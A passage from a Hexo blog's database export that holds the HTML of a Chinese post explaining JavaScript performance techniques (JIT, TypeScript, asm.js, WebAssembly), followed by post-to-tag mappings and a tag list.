id=\"JIT\"><a href=\"#JIT\" class=\"headerlink\" title=\"JIT\"></a>JIT</h3><blockquote>\n<p>google 在 09 年 v8 引擎里引入 just in time compiling（即时编译），跟之前 ajax 出现引起的轰动是一样的，性能瞬间就上升了 20-40 倍的速度。</p>\n</blockquote>\n<ul>\n<li>从此网页进入了网页应用的时代</li>\n</ul>\n<h4 id=\"解释器和编译器\"><a href=\"#解释器和编译器\" class=\"headerlink\" title=\"解释器和编译器\"></a>解释器和编译器</h4><ul>\n<li>解释器是一行行解释代码，性能会下降。编译器是把源代码编译成目标代码。</li>\n<li>解释器是叫他干什么立刻就去干什么，比如买菜，马上去市场回来，再去买油又马上市场</li>\n<li>编译器是叫他干什么直到说完才去干什么，去买菜，买油统一去市场</li>\n</ul>\n<ul>\n<li>但是 jit 是基于运行期编译，js 是一个没有类型的语言，所以 jit 大多数时候都在猜测 js 的类型。</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">a, b</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> a + b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"number\">2</span>); <span class=\"comment\">//这时候jit就把a和b确认为int类型</span></span><br><span class=\"line\"><span class=\"comment\">//然后你这样做</span></span><br><span class=\"line\">add(<span class=\"string\">\"hi\"</span>, <span class=\"string\">\"yoki\"</span>); <span class=\"comment\">//已经编译成机器码了，但是又变成字符串类型，只能推倒重来，有时候jit的性能提升，还没有这个重编的开销大</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"TypeScript\"><a href=\"#TypeScript\" class=\"headerlink\" title=\"TypeScript\"></a>TypeScript</h3><ul>\n<li>既然 jit 大多数时候在猜测类型，那索性搞个强类型语言，再编译成 js 就行了</li>\n</ul>\n<h3 id=\"asm-js\"><a href=\"#asm-js\" class=\"headerlink\" title=\"asm.js\"></a>asm.js</h3><ul>\n<li>ts 是 js 的超集，这个是语法兼容 js 的汇编语言，是 js 的子集</li>\n<li>通过标注声明类型，而且不得改变，这样就节省了类型判断的时间</li>\n</ul>\n<h3 id=\"WebAssembly\"><a href=\"#WebAssembly\" class=\"headerlink\" title=\"WebAssembly\"></a>WebAssembly</h3><ul>\n<li>一种二进制码的规范，是比 asm.js 更为激进的东西</li>\n<li>理论上所有语言都可以编译成这个，然后泡在浏览器上</li>\n<li>但是目前还摸不了 dom</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"简单介绍\"><a href=\"#简单介绍\" class=\"headerlink\" title=\"简单介绍\"></a>简单介绍</h2><ul>\n<li>javascript 是解释性语言，性能很慢，随着 web 在生活中的普及，这点性能显然不够用。你能想象双十一的一个按钮点半天才有反应嘛？所幸很多大神，都在不断的改进这个性能问题</li>\n</ul>\n<h2 id=\"漫漫填坑路\"><a href=\"#漫漫填坑路\" class=\"headerlink\" title=\"漫漫填坑路\"></a>漫漫填坑路</h2><h3 id=\"JIT\"><a href=\"#JIT\" class=\"headerlink\" title=\"JIT\"></a>JIT</h3><blockquote>\n<p>google 在 09 年 v8 引擎里引入 just in time compiling（即时编译），跟之前 ajax 出现引起的轰动是一样的，性能瞬间就上升了 20-40 倍的速度。</p>\n</blockquote>\n<ul>\n<li>从此网页进入了网页应用的时代</li>\n</ul>\n<h4 id=\"解释器和编译器\"><a href=\"#解释器和编译器\" class=\"headerlink\" title=\"解释器和编译器\"></a>解释器和编译器</h4><ul>\n<li>解释器是一行行解释代码，性能会下降。编译器是把源代码编译成目标代码。</li>\n<li>解释器是叫他干什么立刻就去干什么，比如买菜，马上去市场回来，再去买油又马上市场</li>\n<li>编译器是叫他干什么直到说完才去干什么，去买菜，买油统一去市场</li>\n</ul>\n<ul>\n<li>但是 jit 是基于运行期编译，js 是一个没有类型的语言，所以 jit 大多数时候都在猜测 js 的类型。</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">a, b</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> a + b;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"number\">2</span>); <span class=\"comment\">//这时候jit就把a和b确认为int类型</span></span><br><span class=\"line\"><span class=\"comment\">//然后你这样做</span></span><br><span class=\"line\">add(<span class=\"string\">\"hi\"</span>, <span class=\"string\">\"yoki\"</span>); <span class=\"comment\">//已经编译成机器码了，但是又变成字符串类型，只能推倒重来，有时候jit的性能提升，还没有这个重编的开销大</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"TypeScript\"><a href=\"#TypeScript\" class=\"headerlink\" title=\"TypeScript\"></a>TypeScript</h3><ul>\n<li>既然 jit 大多数时候在猜测类型，那索性搞个强类型语言，再编译成 js 就行了</li>\n</ul>\n<h3 id=\"asm-js\"><a href=\"#asm-js\" class=\"headerlink\" title=\"asm.js\"></a>asm.js</h3><ul>\n<li>ts 是 js 的超集，这个是语法兼容 js 的汇编语言，是 js 的子集</li>\n<li>通过标注声明类型，而且不得改变，这样就节省了类型判断的时间</li>\n</ul>\n<h3 id=\"WebAssembly\"><a href=\"#WebAssembly\" class=\"headerlink\" title=\"WebAssembly\"></a>WebAssembly</h3><ul>\n<li>一种二进制码的规范，是比 asm.js 更为激进的东西</li>\n<li>理论上所有语言都可以编译成这个，然后泡在浏览器上</li>\n<li>但是目前还摸不了 dom</li>\n</ul>\n"}],"PostAsset":[],"PostCategory":[],"PostTag":[{"post_id":"cjsm034iu00000ioft11x0cf5","tag_id":"cjsm034jf00040iofovufu641","_id":"cjsm034jn00090iofxqx3nh9q"},{"post_id":"cjsm034j900020iof3gsyd9h7","tag_id":"cjsm034jf00040iofovufu641","_id":"cjsm034jp000d0iofs0qio7qw"},{"post_id":"cjsm034jh00050iofjdrkp34y","tag_id":"cjsm034jo000c0iofqhnpxvlm","_id":"cjsm034jt000i0iofgu2erka2"},{"post_id":"cjsm034ji00060iofch2ya4zf","tag_id":"cjsm034jo000c0iofqhnpxvlm","_id":"cjsm034jy000m0iof9zjw4hmi"},{"post_id":"cjsm034ju000j0iofcbjwbctl","tag_id":"cjsm034jo000c0iofqhnpxvlm","_id":"cjsm034jz000o0iof1e4x6qjp"},{"post_id":"cjsm034jk00070iofhyvcnbgs","tag_id":"cjsm034jw000k0iofb390ie8z","_id":"cjsm034k0000r0iofzj4szfdh"},{"post_id":"cjsm034jn000a0iof1ddho2wm","tag_id":"cjsm034jz000p0iof1f2rigf2","_id":"cjsm034k2000v0iofck7dhlis"},{"post_id":"cjsm034k2000w0iof15b4xvs6","tag_id":"cjsm034k1000t0iofihbfaqhq","_id":"cjsm034k4000z0iofg5viojea"},{"post_id":"cjsm034jo000b0iofs11f1xn2","tag_id":"cjsm034k1000t0iofihbfaqhq","_id":"cjsm034k400110iofz7sjv7kl"},{"post_id":"cjsm034jp000e0iofcboiidh5","tag_id":"cjsm034jz000p0iof1f2rigf2","_id":"cjsm034k600140iof8u4q63gf"},{"post_id":"cjsm034jr000f0iofev9q65ve","tag_id":"cjsm034k500130iof6563kz7i","_id":"cjsm034k800190iofka8d8ms3"},{"post_id":"cjsm034jx000l0iofjb1w9sff","tag_id":"cjsm034jz000p0iof1f2rigf2","_id":"cjsm034kb001d0iofbna0zwxg"},{"post_id":"cjsm034jy000n0iof36a3oixa","tag_id":"cjsm034k1000t0iofihbfaqhq","_id":"cjsm034kg001h0iof8aoli87n"},{"post_id":"cjsm034jz000q0iofvvwm9goa","tag_id":"cjsm034kf001f0iofrrivyfwh","_id":"cjsm034kh001j0iof94h4z26s"},{"post_id":"cjsm034k0000s0iofqdk4exwz","tag_id":"cjsm034kh001i0ioftwds4pdf","_id":"cjsm034kh001l0iofpvjd3s2x"},{"post_id":"cjsm034k1000u0iofjoik5hef","tag_id":"cjsm034kh001k0iof8qp3jtc4","_id":"cjsm034kh001n0iof06qfffzg"},{"post_id":"cjsm034k3000x0iof5okaoozb","tag_id":"cjsm034kh001m0iofpnzi5ebq","_id":"cjsm034ki001p0iofc9n0830a"},{"post_id":"cjsm034k400100iofgmmh7m3m","tag_id":"cjsm034kh001o0iofqhln5dpx","_id":"cjsm034ki001r0iofizc7sa1y"},{"post_id":"cjsm034k500120iof4fx5a29o","tag_id":"cjsm034kh001o0iofqhln5dpx","_id":"cjsm034ki001t0iofephs1gs4"},{"post_id":"cjsm034k600150iofegmtn2ht","tag_id":"cjsm034ki001s0iof084pglwz","_id":"cjsm034kj001v0iofa3omz6x2"},{"post_id":"cjsm034k600160iofmhaae5cf","tag_id":"cjsm034ki001s0iof084pglwz","_id":"cjsm034kj001x0ioflzoh9z4x"},{"post_id":"cjsm034k800180iofvsteo6qh","tag_id":"cjsm034ki001s0iof084pglwz","_id":"cjsm034kk001z0iofaj8vw4vr"},{"post_id":"cjsm034k8001a0iofb17xecfx","tag_id":"cjsm034ki001s0iof084pglwz","_id":"cjsm034kk00210iof0t6mh4hq"},{"post_id":"cjsm034ka001c0iof24ar5zkh","tag_id":"cjsm034ki001s0iof084pglwz","_id":"cjsm034kl00230iof3vfolpzd"},{"post_id":"cjsm034kd001e0iofvhpnlibb","tag_id":"cjsm034ki001s0iof084pglwz","_id":"cjsm034kl00250iofso0l7vz1"},{"post_id":"cjsm034kg001g0iof569o4iwu","tag_id":"cjsm034ki001s0iof084pglwz","_id":"cjsm034kl00260iofwjvsdx8w"},{"post_id":"cjsm034qg00270iofak74hsz3","tag_id":"cjsm034kf001f0iofrrivyfwh","_id":"cjsm034qk002a0iofzo3ytf5u"},{"post_id":"cjsm034qk002b0iofo6vlogp4","tag_id":"cjsm034kh001m0iofpnzi5ebq","_id":"cjsm034qm002e0iofp6y02nu2"},{"post_id":"cjsm034ql002d0iofbxem1ek7","tag_id":"cjsm034jz000p0iof1f2rigf2","_id":"cjsm034qn002g0iof6o0mic8u"},{"post_id":"cjsm034qi00290iof2omuks02","tag_id":"cjsm034ql002c0ioflxx07a1g","_id":"cjsm034qp002j0iof7he5l6vy"},{"post_id":"cjsm034qn002h0iof8nnayk9f","tag_id":"cjsm034kh001m0iofpnzi5ebq","_id":"cjsm034qq002l0iof9jzzvkka"},{"post_id":"cjsm034qp002k0iof7kqpg1iv","tag_id":"cjsm034kh001m0iofpnzi5ebq","_id":"cjsm034qv002n0iofsfhps5gy"},{"post_id":"cjsm034qr002m0ioftaw740x6","tag_id":"cjsm034kf001f0iofrrivyfwh","_id":"cjsm034qy002p0ioffsonvv30"},{"post_id":"cjsm034qm002f0iofbvgmpd3u","tag_id":"cjsm034qp002i0iof5nrjj10q","_id":"cjsm034qz002r0iof7drnygvw"},{"post_id":"cjsm034qw002o0iofv4d39k0b","tag_id":"cjsm034k1000t0iofihbfaqhq","_id":"cjsm034r1002t0iofv85xj9hx"},{"post_id":"cjsm034qy002q0iofdnjgdv6b","tag_id":"cjsm034ki001s0iof084pglwz","_id":"cjsm034r2002w0iofjf9342lv"},{"post_id":"cjsm034r2002x0iofra5f8vrk","tag_id":"cjsm034ki001s0iof084pglwz","_id":"cjsm034r4002z0iofyowssqiu"},{"post_id":"cjsm034r3002y0ioffe6h4fgn","tag_id":"cjsm034kh001m0iofpnzi5ebq","_id":"cjsm034r500320iofu233v3co"},{"post_id":"cjsm034r0002s0iofhcrm0wcu","tag_id":"cjsm034r2002v0iofjix68vfb","_id":"cjsm034r600340ioffbijqqz5"},{"post_id":"cjsm034r400300iof299oey7i","tag_id":"cjsm034kh001m0iofpnzi5ebq","_id":"cjsm034r700360iof6abzghyy"},{"post_id":"cjsm034r500330iof6vu1q55a","tag_id":"cjsm034kh001m0iofpnzi5ebq","_id":"cjsm034rb00380iof39wyoypz"},{"post_id":"cjsm034r1002u0iofo2rwmf1w","tag_id":"cjsm034r500310iof0bupzfc7","_id":"cjsm034re003a0iofld7c7q4h"},{"post_id":"cjsm034r600350ioft3jdfi9m","tag_id":"cjsm034kh001o0iofqhln5dpx","_id":"cjsm034rh003c0iofpzo5tpm6"},{"post_id":"cjsm034r700370iofg6dv9b4q","tag_id":"cjsm034r2002v0iofjix68vfb","_id":"cjsm034ri003e0iofit2ilm9c"},{"post_id":"cjsm034rc00390iofssh233av","tag_id":"cjsm034kh001m0iofpnzi5ebq","_id":"cjsm034rp003g0iofv204man0"},{"post_id":"cjsm034rf003b0iofwl5vsv1i","tag_id":"cjsm034jz000p0iof1f2rigf2","_id":"cjsm034rr003i0iofsw1a75wn"},{"post_id":"cjsm034rh003d0iofwukfqlsz","tag_id":"cjsm034kh001m0iofpnzi5ebq","_id":"cjsm034rt003l0ioffc8qlr93"},{"post_id":"cjsm034ri003f0iofqg5q701p","tag_id":"cjsm034jz000p0iof1f2rigf2","_id":"cjsm034ru003n0iofs4owjb25"},{"post_id":"cjsm034rr003j0iofyba1jr0o","tag_id":"cjsm034jz000p0iof1f2rigf2","_id":"cjsm034rv003p0iofkyouhxxu"},{"post_id":"cjsm034rv003o0iofsoqzbx2h","tag_id":"cjsm034rt003k0iof0qhqvodi","_id":"cjsm034rx003s0iofoqlb4kqz"},{"post_id":"cjsm034rp003h0iof2p5uly91","tag_id":"cjsm034rt003k0iof0qhqvodi","_id":"cjsm034ry003u0iofkd1mf852"},{"post_id":"cjsm034rw003q0iof87iy35sr","tag_id":"cjsm034kh001o0iofqhln5dpx","_id":"cjsm034rz003w0iofvxupjmu0"},{"post_id":"cjsm034rx003t0iof898kjhm2","tag_id":"cjsm034kh001m0iofpnzi5ebq","_id":"cjsm034rz003y0iofd729kvqu"},{"post_id":"cjsm034rt003m0iof9pdfj0tc","tag_id":"cjsm034rt003k0iof0qhqvodi","_id":"cjsm034s000400iof10xdx19z"},{"post_id":"cjsm034ry003v0iof2uok3n9o","tag_id":"cjsm034kh001o0iofqhln5dpx","_id":"cjsm034s200420iofd3vyxox1"},{"post_id":"cjsm034rz003x0iofej5e3o7o","tag_id":"cjsm034jz000p0iof1f2rigf2","_id":"cjsm034s200440iofwvh4o5l1"},{"post_id":"cjsm034s0003z0iofg6vpo6az","tag_id":"cjsm034kh001m0iofpnzi5ebq","_id":"cjsm034s400460iofqfpqumcc"},{"post_id":"cjsm034s000410iofk9vmc74c","tag_id":"cjsm034kh001m0iofpnzi5ebq","_id":"cjsm034s600480iofb9ydcz1n"},{"post_id":"cjsm034s200430ioferf2owh5","tag_id":"cjsm034r500310iof0bupzfc7","_id":"cjsm034sa004a0iofwlzyvjha"},{"post_id":"cjsm034s300450iofgzvd1nbp","tag_id":"cjsm034jz000p0iof1f2rigf2","_id":"cjsm034sc004d0ioffvvnngq5"},{"post_id":"cjsm034s400470iofkoedazmy","tag_id":"cjsm034r500310iof0bupzfc7","_id":"cjsm034sd004f0iofbwi9tets"},{"post_id":"cjsm034s600490iof3eso58sd","tag_id":"cjsm034sc004c0iofkmynt6zz","_id":"cjsm034sl004j0iof7pe8yyaq"},{"post_id":"cjsm034si004h0iofupo94b6c","tag_id":"cjsm034r2002v0iofjix68vfb","_id":"cjsm034sp004l0iofuz2myzf2"},{"post_id":"cjsm034sc004e0iofm57tuv29","tag_id":"cjsm034sk004i0iofkukcwl2b","_id":"cjsm034st004p0iofh1t78tua"},{"post_id":"cjsm034sq004m0iofm9d1b1s4","tag_id":"cjsm034kh001m0iofpnzi5ebq","_id":"cjsm034su004r0ioff9zfpjk4"},{"post_id":"cjsm034st004o0iof0f9yb6w2","tag_id":"cjsm034kh001m0iofpnzi5ebq","_id":"cjsm034sw004u0iof1iejscj1"},{"post_id":"cjsm034se004g0iofhiut53m5","tag_id":"cjsm034sk004i0iofkukcwl2b","_id":"cjsm034sx004w0iofno4w82c1"},{"post_id":"cjsm034su004q0iof5tonvbm0","tag_id":"cjsm034jz000p0iof1f2rigf2","_id":"cjsm034sy004y0iofl72r0rls"},{"post_id":"cjsm034sv004t0iofvnv3263m","tag_id":"cjsm034jz000p0iof1f2rigf2","_id":"cjsm034sz00500iofgf0ngyc3"},{"post_id":"cjsm034sl004k0iof8i1tu8an","tag_id":"cjsm034sv004s0iof3ow3yas1","_id":"cjsm034t000520iofbunt0raz"},{"post_id":"cjsm034sw004v0iofp7y7asuh","tag_id":"cjsm034jz000p0iof1f2rigf2","_id":"cjsm034t200540iofvpna6bu9"},{"post_id":"cjsm034sx004x0iofqvefhfhd","tag_id":"cjsm034jo000c0iofqhnpxvlm","_id":"cjsm034t300560iofm41ebiiz"},{"post_id":"cjsm034sy004z0iofid47jjgm","tag_id":"cjsm034qp002i0iof5nrjj10q","_id":"cjsm034t400570iofarb2ca4v"},{"post_id":"cjsm034t000510iofzz4sd71x","tag_id":"cjsm034jz000p0iof1f2rigf2","_id":"cjsm034t400580ioflaa391oi"},{"post_id":"cjsm034t100530iof3t4kvk8w","tag_id":"cjsm034jz000p0iof1f2rigf2","_id":"cjsm034t400590iofyps946gm"},{"post_id":"cjsm034t200550iof9ikle603","tag_id":"cjsm034jz000p0iof1f2rigf2","_id":"cjsm034t5005a0iofpc62fyaw"}],"Tag":[{"name":"Hexo","_id":"cjsm034jf00040iofovufu641"},{"name":"生活随想","_id":"cjsm034jo000c0iofqhnpxvlm"},{"name":"mysql","_id":"cjsm034jw000k0iofb390ie8z"},{"name":"javascript","_id":"cjsm034jz000p0iof1f2rigf2"},{"name":"git","_id":"cjsm034k1000t0iofihbfaqhq"},{"name":"前端","_id":"cjsm034k500130iof6563kz7i"},{"name":"css","_id":"cjsm034kf001f0iofrrivyfwh"},{"name":"markdown","_id":"cjsm034kh001i0ioftwds4pdf"},{"name":"vue","_id":"cjsm034kh001k0iof8qp3jtc4"},{"name":"浏览器","_id":"cjsm034kh001m0iofpnzi5ebq"},{"name":"计算机基础","_id":"cjsm034kh001o0iofqhln5dpx"},{"name":"图解算法","_id":"cjsm034ki001s0iof084pglwz"},{"name":"数据结构与算法","_id":"cjsm034ql002c0ioflxx07a1g"},{"name":"node","_id":"cjsm034qp002i0iof5nrjj10q"},{"name":"Http","_id":"cjsm034r2002v0iofjix68vfb"},{"name":"计算机网络","_id":"cjsm034r500310iof0bupzfc7"},{"name":"nginx","_id":"cjsm034rt003k0iof0qhqvodi"},{"name":"Typescript","_id":"cjsm034sc004c0iofkmynt6zz"},{"name":"Vue","_id":"cjsm034sk004i0iofkukcwl2b"},{"name":"工作复盘","_id":"cjsm034sv004s0iof3ow3yas1"}]}}